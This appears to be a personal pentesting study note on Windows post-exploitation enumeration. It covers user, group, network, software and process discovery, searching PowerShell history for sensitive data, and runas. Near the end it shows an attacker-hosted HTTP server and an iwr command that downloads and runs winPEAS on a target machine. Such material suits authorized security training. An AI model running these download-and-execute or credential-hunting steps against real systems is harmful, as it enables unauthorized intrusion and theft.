# General Info
First things to hunt are
```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

first things first
```
whoami
```

for group information
```
whoami /groups
```

for the following commands make sure you start a powershell session
```
powershell
```

now to find info on other users
```
Get-LocalUser
```

for info on all groups
```
Get-LocalGroup
```

Groups to look for are
1. Administrators
2. Backup Operators
3. Remote Desktop Users
4. and Remote Management Users.

Members of _Backup Operators_ can backup and restore all files on a computer, even those files they don't have permissions for. We must not confuse this group with non-standard groups such as _BackupUsers_ in our example.

if you would like to know the users that belong to a specific group you may use
```
Get-LocalGroupMember <groupname>
```
if group name includes spaces `""` double quotes are required

for OS, version, and architecture
```
systeminfo
```

for network information
```
ipconfig /all
```

to get a routing table
```
route print
```

To list all active network connections we can use [_netstat_](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) with the argument **-a** to display all active TCP connections as well as TCP and UDP ports, **-n** to disable name resolution, and **-o** to show the process ID for each connection.
```
netstat -ano
```

to check all installed applications. We can query [two registry keys](https://devblogs.microsoft.com/scripting/use-powershell-to-find-installed-software/) to list both 32-bit and 64-bit applications in the _Windows Registry_ with the [_Get-ItemProperty_](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-itemproperty?view=powershell-7.2) Cmdlet. We pipe the output to **select** with the argument **displayname** to only display the application's names. We begin with the 32-bit applications and then display the 64-bit applications.
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
for 32 bit look above
for 64 bit look below
```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

However, the listed applications from Listing 15 may not be complete. For example, this could be due to an incomplete or flawed installation process. Therefore, we should always check 32-bit and 64-bit **Program Files** directories located in **C:\\**. Additionally, we should review the contents of the **Downloads** directory of our user to find more potential programs.



to find currently running processes use
```
Get-Process
```

# Plain sight data And search strings

To search the whole machine for a file suffix
```
Get-ChildItem -Path C:\ -Include *.<suffix here> -File -Recurse -ErrorAction SilentlyContinue
```



Someone please write something on RUNAS for the sake of everything it's how you execute as a different user
```
runas /user:backupadmin cmd
```


## Powershell history

A good first check is
```
Get-History
```
but this history can be cleared quite easily so don't count on it having sensitive data

```
(Get-PSReadlineOption).HistorySavePath
```
this shows you the path to a file that should have all Powershell history saved
Then just use the `Type` command to view the contents of said file.

If you `type` the file path above and then pipe it into `FINDSTR` which acts like grep, you can use it to find very interesting info.

> [!tip]
> Look into `evil-winrm`


# Automated Enumeration

## winpeas
run a python web server in the same directory you have winpeas stored
```
python3 -m http.server 80
```

then on the target machine run
```
iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
```
Obviously change the IP you idiot

Then simply run
```
.\winPEAS.exe
```
on the target machine and enjoy the info dump
